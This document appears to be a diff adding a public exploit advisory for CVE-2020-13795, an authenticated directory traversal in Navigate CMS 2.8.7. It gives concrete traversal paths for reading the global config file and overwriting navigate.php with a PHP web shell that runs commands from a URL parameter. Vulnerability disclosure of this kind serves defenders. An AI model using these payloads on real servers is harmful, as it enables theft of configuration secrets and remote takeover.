@@ -1,0 +1,29 @@
+# Exploit Title: Navigate CMS 2.8.7 - Authenticated Directory Traversal
+# Date: 2020-06-04
+# Exploit Author: Gus Ralph
+# Vendor Homepage: https://www.navigatecms.com/en/home
+# Software Link: https://sourceforge.net/projects/navigatecms/files/releases/navigate-2.8.7r1401.zip/download
+# Version: 2.8.7
+# Tested on: Ubuntu
+# CVE: CVE-2020-13795
+
+A malicious user can abuse the authenticated templates functionality to traverse out of the templates directory to read and write to any file on the webserver as www-data.
+
+For this vulnerability, I looked into the "templates" feature of the application. It seems we can edit any file in the application's templates directory, for example:
+ `/var/www/html/navigate/private/1/templates/`
+ 
+My initial thought was to traverse out of the current directory and read the global config file (located at `/var/www/html/navigate/cfg/globals.php`).
+
+My payload would then consist of creating a template, setting the path to be `/var/www/html/navigate/private/1/templates/../../../cfg/globals.php`
+
+Furthermore, this can be abused to write to a PHP file and gain RCE on the remote server, for example:
+
+Traversal payload:
+`../../../navigate.php`
+
+PHP Code execution payload:
+```
+<?php
+system($_GET['cmd']);
+?>
+```
